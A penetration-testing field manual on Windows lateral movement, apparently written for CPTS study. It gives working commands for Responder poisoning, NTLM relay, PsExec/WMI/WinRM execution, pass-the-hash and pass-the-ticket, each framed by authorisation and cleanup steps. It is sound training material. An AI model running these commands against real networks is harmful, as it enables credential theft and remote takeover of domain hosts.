---
title: "Windows Lateral Movement"
description: "LLMNR/NBT-NS poisoning, NTLM relay, PsExec, WMI, WinRM, pass-the-hash, and pass-the-ticket."
category: "Field Manual"
tags: ["field-manual", "cpts", "windows", "lateral-movement", "ntlm"]
date: 2026-11-11
published: true
status: archive
---

# Windows Lateral Movement

Use `DOMAIN`, `NETBIOS`, `AD_USER`, `AD_PASSWORD`, `DC_HOST`, and `DC_IP` from [[pending/field-manual/01-information-gathering/active-directory-enumeration#Establish the collection context|AD enumeration]]. Set `TARGET_HOST` to the selected service FQDN and keep local accounts (`LOCAL_USER`) separate from domain accounts. A credential or graph edge is a lead; the proof is an authorised operation on the intended destination.

| Additional input | Required source |
|---|---|
| `TARGET_USER`, `LOCAL_USER` | Selected domain or host-local identity; do not infer account scope from a bare username |
| `IFACE`, `LISTENER_IP` | Approved segment-facing interface and its intended bound relay address |
| `WORDLIST` | Reviewed local candidate file for the selected captured-response cracking job |
| `NTHASH`, `AES_KEY` | Approved raw NT hash or AES256 Kerberos key belonging to the selected principal |
| `CCACHE` | Exact file reported by ticket acquisition or a protected copy of an approved existing FILE cache |
| `CONTROLLED_COMPUTER` | Existing controlled SPN-bearing account's actual `sAMAccountName`, with trailing `$` for a machine |
| `CA_HOST`, `RELAY_TEMPLATE` | Selected enrolment server and published template eligible for the relayed principal |

Populate these separately on Linux and in the Windows session where they are needed. The common `AD_CRED` is a PowerShell credential object; it does not define Bash's password variable or change the current process identity. Ticket import uses the actual approved artifact and an isolated logon session, as detailed in [[pending/field-manual/03-exploitation/active-directory-credential-attacks#Import a ticket and prove service access|the Windows PtT input setup]].

## Choose the next host and protocol

| Starting condition | Candidate route | Validate before execution |
|---|---|---|
| Readable SMB share | Selected share/file operation | Share and NTFS permissions; no local-admin assumption |
| Domain/local administrator on a member | WMI, service, or task execution | Effective remote token, SCM/WMI/task rights, required network paths |
| WinRM-authorised user | PowerShell Remoting | Listener, endpoint ACL, deny policies, identity/authentication method |
| Existing NT hash | NTLM PtH | Account scope, NTLM policy, and service-specific authorisation |
| Existing Kerberos ticket/key | PtT / Pass-the-Key | Principal, SPN, expiry, DNS, time, KDC, and destination rights |
| Approved elicited NTLM authentication | One selected relay destination | Protocol-specific relay protections and exact post-authentication action |

- [ ] Choose one source identity → destination host → service/action relationship.
- [ ] Confirm the destination is in scope and reachable from the actual network position.
- [ ] Define a minimal proof such as share listing or `whoami`/`hostname`, not an automatic credential dump.
- [ ] Record execution mechanism, expected service/task/file artifacts, and restoration owner.
- [ ] Stop after the agreed operation instead of trying every remote-execution tool.

## LLMNR / NBT-NS poisoning

Where enabled, Windows may use LLMNR/NBT-NS for unresolved names. Passive analysis is different from poisoning; a remote VPN interface may not see the target LAN's broadcast traffic.

```bash
sudo responder -I "$IFACE" -A
```

Only after the segment, services, and test window are approved, active poisoning is an alternative:

```bash
sudo responder -I "$IFACE" -v
hashcat -m 5600 netntlmv2.txt "$WORDLIST" --session relay-capture-review
```

Captured NetNTLMv2 responses are challenge/response material, not the raw NT hashes supplied to PtH tools. Use offline cracking or a separately validated relay path. Responder's SMB/HTTP listeners can conflict with ntlmrelayx on the same ports; review its configuration and disable only the conflicting **assessment-local** listeners when relay is the approved goal.

Defences: disable LLMNR/NBT-NS, require SMB signing, enable EPA, segment networks.

## NTLM relay

Distinguish the listener, authentication source, relayed identity, destination protocol, and post-authentication operation. A successful incoming connection is not a successful relay, and a successful relay is not automatically administrator access.

| Destination | Standard relay gate | Important limit |
|---|---|---|
| SMB | NTLM accepted; required SMB signing normally prevents the standard relay path | A signing-disabled host still requires suitable rights for the requested action |
| LDAP | NTLM/SASL signing and integrity requirements allow the particular relayed exchange | LDAP signing is distinct from SMB signing and account/object rights |
| LDAPS | Effective LDAP channel binding and authentication protections allow the path | TLS does not automatically permit or prevent relay; CBT matters |
| HTTP(S) / AD CS | NTLM accepted without effective EPA/service binding protection | HTTPS alone is not an ESC8 defence; template/CA enrolment rights still apply |

These are standard-path gates, not universal claims about every historical/current protocol vulnerability. A MIC/channel-binding/signing bypass is a separate, version-specific finding requiring evidence and approval; do not enable bypass switches as generic troubleshooting.

For one explicitly approved SMB command proof, bind the listener and choose the operation rather than relying on default dumping behaviour:

```bash
sudo impacket-ntlmrelayx -ip "$LISTENER_IP" -t "smb://$TARGET_HOST" \
  -smb2support -c 'whoami'
```

Even `whoami` uses a remote execution mechanism and may create services/tasks or temporary output files. Check the installed implementation and stop after one intended successful action; omitting `-c` in an SMB attack can trigger SAM collection.

LDAP RBCD is a **directory write**, not a read-only relay proof. For an approved path using an existing controlled account, the explicit attack selection is:

```bash
sudo impacket-ntlmrelayx -ip "$LISTENER_IP" -t "ldaps://$DC_HOST" \
  -smb2support --delegate-access --escalate-user "$CONTROLLED_COMPUTER" --no-dump --no-da --no-acl
```

Verify the installed LDAP attack code and options first. `--delegate-access` can create an account when none is supplied and write the relayed computer's RBCD descriptor; it does not guarantee either operation succeeds. Save the original target property and identify the precise modified DN/SID before triggering authentication. The ticket and restoration workflow is in [[pending/field-manual/03-exploitation/active-directory-delegation-and-acl#Resource-based constrained delegation (RBCD)|RBCD]].

For web-enrolment relay, `--adcs` and the eligible template are required, not just an HTTP URL:

```bash
sudo impacket-ntlmrelayx -ip "$LISTENER_IP" -t "https://$CA_HOST/certsrv/certfnsh.asp" \
  -smb2support --adcs --template "$RELAY_TEMPLATE"
```

Follow [[pending/field-manual/03-exploitation/adcs-exploitation#ESC8 — NTLM relay to HTTP enrollment|AD CS ESC8]] for certificate issuance, mapping, PKINIT, and revocation. Use one approved authentication trigger only after the listener and destination are ready. PrinterBug/PetitPotam depend on RPC/service/patch state; a coerced connection does not prove relay or a forwarded Kerberos TGT.

## PsExec family

```bash
impacket-psexec "$DOMAIN/$AD_USER@$TARGET_HOST" 'whoami'
impacket-smbexec "$DOMAIN/$AD_USER@$TARGET_HOST"
impacket-wmiexec "$DOMAIN/$AD_USER@$TARGET_HOST" 'whoami'
impacket-atexec "$DOMAIN/$AD_USER@$TARGET_HOST" 'whoami'
```

| Tool | Mechanism | Access / artifact considerations |
|---|---|---|
| `psexec` | Upload + service creation | Writable administrative share, SCM access, uploaded executable/service artifacts |
| `smbexec` | Service-backed command shell | SCM rights and temporary command/output artifacts; not an automatically artifact-free path |
| `wmiexec` | DCOM/WMI process creation | RPC 135/dynamic ports, WMI rights, often SMB output retrieval; no created service does not mean no logs |
| `atexec` | Task Scheduler RPC | Task registration/execution rights and temporary task/output artifacts |
| `nxc smb -x` | Selected SMB execution wrapper | Underlying mechanism depends on version/`--exec-method`; record it |

The Impacket commands prompt for a password and are alternatives, not a sequence. An interactive `smbexec` session should run only the chosen proof and then exit. A successful SMB login or NetExec administrative marker is a useful indication but does not explain every application's permissions or prove the chosen action executed.

For a selected NetExec execution method:

```bash
nxc smb "$TARGET_HOST" -u "$AD_USER" -p "$AD_PASSWORD" -d "$DOMAIN" --exec-method wmiexec -x 'whoami'
nxc smb "$TARGET_HOST" -u "$AD_USER" -p "$AD_PASSWORD" -d "$DOMAIN" --exec-method wmiexec -X '$env:COMPUTERNAME'
```

Choose shell (`-x`) or PowerShell (`-X`) according to the intended operation. Broad process enumeration, credential collection, or account creation is not necessary for an identity/hostname proof.

## WMI and WinRM

```bash
nxc winrm "$TARGET_HOST" -u "$AD_USER" -p "$AD_PASSWORD" -d "$DOMAIN" -x 'whoami'
evil-winrm -i "$TARGET_HOST" -u "$AD_USER@$DOMAIN" -p "$AD_PASSWORD"
```

```powershell
$AD_CRED = Get-Credential -UserName "$NETBIOS\$AD_USER"
Invoke-Command -ComputerName $TARGET_HOST -Authentication Kerberos -Credential $AD_CRED -ScriptBlock { whoami; hostname }
Enter-PSSession -ComputerName $TARGET_HOST -Authentication Kerberos -Credential $AD_CRED
```

Default WinRM uses TCP 5985/5986; authenticate with the service FQDN matching its SPN when choosing Kerberos. Remoting requires the endpoint ACL and applicable logon rights; local-administrator/Remote Management Users membership is not a universal guarantee, and deny policies/JEA/custom endpoints may restrict commands. Do not add broad TrustedHosts entries, ignore TLS identity, or enable WinRM on a production host as automatic troubleshooting.

### Kerberos double-hop diagnosis

In `assessment host → member A → DC/resource B`, a normal WinRM network logon to A does not automatically delegate reusable credentials or the user's TGT for B. Successful `whoami` on A therefore does not prove that PowerView, RSAT, or a UNC path can authenticate to B. NTLM sessions can have the same outbound-credential limitation; this is not a Kerberos-only password failure.

In the session on A, distinguish identity, tickets, name resolution, and reachability:

```powershell
whoami
hostname
klist
Resolve-DnsName $DC_HOST
Test-NetConnection -ComputerName $DC_HOST -Port 389
```

An operations/access error from a directory query can result from missing outbound credentials, but also from DNS, ports, or ACLs. A TGT's absence in this logon context is a clue, not a complete diagnosis. A TGT requests service tickets from the KDC; it does not locally sign arbitrary KDC-issued tickets.

Prefer an explicit credential for the one supported outbound operation, using the approved account and known DC:

```powershell
$OUTBOUND_CRED = Get-Credential -UserName "$NETBIOS\$AD_USER" -Message 'Authorised outbound directory query'
Get-ADUser -Identity $TARGET_USER -Server $DC_HOST -Credential $OUTBOUND_CRED -Properties ServicePrincipalNames
Get-DomainUser -Identity $TARGET_USER -Domain $DOMAIN -Server $DC_HOST -Credential $OUTBOUND_CRED
```

The native and PowerView commands are alternatives and require their respective modules. Populating `OUTBOUND_CRED` does not change every process's identity or grant new directory rights. If a nested remoting operation is actually needed, explicitly supply the authorised credential to that operation rather than assuming the first hop forwards it.

| Alternative | Boundary / risk |
|---|---|
| Query directly from the assessment host through an existing scoped tunnel | Avoids the second-hop logon context; DNS, KDC, and all required ports still need a working path |
| Approved interactive/domain logon or isolated network-only ticket context | Can provide outbound credentials/tickets; Restricted Admin, Remote Credential Guard, and protections alter behaviour |
| Existing approved RunAs/JEA endpoint | Runs as the configured identity; endpoint permissions and permitted commands must be verified |
| CredSSP | Delegates credentials to the intermediate host; requires explicit security approval and configuration |
| Classic or resource-based constrained delegation | Service-specific delegation is not a universal PowerShell Remoting second-hop solution; Microsoft documents limitations for WinRM |

Do not register a RunAs endpoint, restart WinRM, enable CredSSP, or switch on unconstrained delegation merely to make a collector work. Those change security/service state and can disconnect real sessions. A separately approved endpoint change needs restricted access, an original-state record, and owner-coordinated restoration. See [[pending/field-manual/03-exploitation/active-directory-credential-attacks#Isolated logon session and PowerShell Remoting|isolated ticket sessions]] for the assessment-local option.

## Pass-the-hash

```bash
nxc smb "$TARGET_HOST" -u "$TARGET_USER" -H "$NTHASH" -d "$DOMAIN" --shares
impacket-wmiexec "$DOMAIN/$TARGET_USER@$TARGET_HOST" -hashes ":$NTHASH" 'whoami'
evil-winrm -i "$TARGET_HOST" -u "$TARGET_USER@$DOMAIN" -H "$NTHASH"
```

Test local vs domain accounts:

```bash
nxc smb "$TARGET_HOST" -u "$LOCAL_USER" -H "$NTHASH" --local-auth
```

PtH uses a raw NT hash, not a NetNTLMv2 response, AES key, or DCC2 cached-logon hash. Local-account UAC filtering can permit authentication but deny remote administration. RDP PtH additionally requires an already-supported Restricted Admin path; do not enable it or suppress server-certificate checks to make the test pass. See [[pending/field-manual/03-exploitation/active-directory-credential-attacks#Pass-the-Hash (PtH)|PtH prerequisites and account scope]].

## Pass-the-ticket

Windows:

```text
mimikatz # kerberos::ptt ticket.kirbi
Rubeus.exe ptt /ticket:<base64>
```

Linux:

```bash
export KRB5CCNAME="$CCACHE"
klist
impacket-smbclient -k -no-pass "$DOMAIN/$TARGET_USER@$TARGET_HOST"
```

Overpass-the-hash (request a TGT from an NT hash):

```bash
impacket-getTGT "$DOMAIN/$TARGET_USER" -hashes ":$NTHASH" -dc-ip "$DC_IP"
export KRB5CCNAME="$CCACHE"
```

```powershell
.\Rubeus.exe asktgt /user:$TARGET_USER /domain:$DOMAIN /dc:$DC_HOST /aes256:$AES_KEY /ptt
```

The RC4/NT-hash and AES alternatives depend on the account's supported encryption types and domain policy. Requesting a KDC-issued TGT is Pass-the-Key/OverPass-the-Hash, not offline ticket forgery. Inspect the represented principal, SPN, flags, and lifetime, and import only into an isolated assessment logon context. A CIFS-only service ticket is not a general-purpose TGT.

## SMB relay targets

Check only the approved host set, without authenticating to every host just to learn signing policy:

```bash
nxc smb approved-hosts.txt --gen-relay-list relay-targets.txt
```

This performs active SMB negotiation and records candidate signing-disabled destinations; it is not authorisation to relay to every entry. Re-check one selected destination and the relayed principal's operation rights. Required SMB signing normally blocks standard SMB relay to a DC; LDAP/LDAPS and HTTP have their own protections and must be assessed separately.

## AD lateral patterns

- Existing domain replication rights → targeted approved DCSync, not an automatic full-domain dump.
- Delegation/ACL/AD CS → one validated account/resource transition and precise original-state restoration.
- Foreign group membership/trust → an in-scope destination operation, not unrestricted forest access.
- Application/service-account rights → map the actual host, service, object, and credential scope.
- Golden Tickets and AdminSDHolder changes are persistence/Tier-0 actions, not routine lateral-movement validation.

## Cleanup

- Confirm the exact assessment-created service/task/file names and the tool's cleanup result; do not delete unrelated services or tasks.
- Restore the precise RBCD/ACL/membership delta before removing any assessment-created machine account.
- Close assessment relay listeners, tunnels, remote sessions, and isolated ticket contexts.
- Coordinate certificate revocation and credential rotation separately; deleting a PFX/cache does not invalidate issued tickets.
- Record source/destination, authentication principal, protocol, execution context, successful operation, artifacts, and owner-confirmed restoration.

## References

- [HackTricks — Lateral movement](https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/index.html)
- [Impacket](https://github.com/fortra/impacket)
- [NetExec wiki](https://www.netexec.wiki/)
- [Responder](https://github.com/lgandx/Responder)
- [Microsoft — PowerShell Remoting second hop](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/ps-remoting-second-hop)
- [Cavementech — Kerberos double-hop problem](https://notes.cavementech.com/pentesting-quick-reference/active-directory-pentesting/active-directory/post-compromise/kerberosting/kerberos-double-hop-problem)
- [Cavementech — SMB / NTLM relay](https://notes.cavementech.com/pentesting-quick-reference/active-directory-pentesting/active-directory/smb-ntlm-relay-attacks)
- [buduboti — AD Enumeration & Attacks](https://github.com/buduboti/CPTS-Walkthrough/blob/main/HTB-Academy/20.%20Active%20Directory%20Enumeration%20%26%20Attacks.md)

These parameterised workflows synthesise the public references rather than reproducing lab credentials or transcript output. Use current installed tool help and the destination's effective policy for version-sensitive choices.
